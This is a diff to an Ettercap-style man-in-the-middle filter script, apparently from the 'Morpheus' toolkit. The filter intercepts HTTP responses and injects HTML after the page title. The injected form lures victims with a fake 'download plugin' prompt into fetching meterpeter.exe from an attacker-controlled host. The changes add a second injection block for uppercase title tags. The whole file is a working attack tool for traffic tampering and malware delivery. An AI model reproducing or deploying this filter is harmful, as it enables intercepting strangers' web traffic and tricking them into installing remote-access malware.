@@ -14,7 +14,6 @@
 #  This filter will inject one payload into target webpage request
 # 'under MitM attacks' replacing the html tag </title> by our code,
 # befor sending the webpage requested to target machine!
-# REMMENBER TO REPLACE THE 'IP ADDRESS' IN THIS EXAMPLE BY YOUR BOX 'IP ADDRESS'
 ##
 
 
@@ -31,10 +30,20 @@ if (ip.proto == TCP && tcp.dst == 80) {
 #####################
 ## Replace Content ##
 #####################
-# replace("</title>", "</title><iframe frameborder=0 scrolling='no' height=180 width=450 src='http://10.0.0.2/iframe.html'></iframe>");
+# IpAdDR == 192.168.1.67 == TARGET HOST
 if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "<title>")) {
-    replace("</title>", "</title><form action='http://192.168.1.67/payload.exe' method='link'><INPUT TYPE='submit' value='DOWNLOAD_PLUGIN'></form><html><body><h10>You are unable to view some of the web page’s contents. You need to download the latest plugins to fix this issue.</h10></body></html>");
+    replace("</title>", "</title><form
+ action=\"http://IpAdDR/meterpeter.exe\" method=\"link\"><img src=\"http://IpAdDR/alert.gif\"><INPUT TYPE=submit value=\"DOWNLOAD meterpeter.exe\"></form><html><body><h10>just some instructions</h10></body></html>");
     msg("[Morpheus] malicious url injected...\n");
   }
 }
+
+if (ip.proto == TCP && tcp.src == 80) {
+   if (search(DATA.data, "<TITLE>")) {
+    replace("</TITLE>", "</TITLE><form
+ action=\"http://IpAdDR/meterpeter.exe\" method=\"link\"><img src=\"http://IpAdDR/alert.gif\"><INPUT TYPE=submit value=\"DOWNLOAD meterpeter.exe\"></form><html><body><h10>just some instructions</h10></body></html>");
+    msg("[Morpheus] malicious url injected...\n");
+  }
+}
+
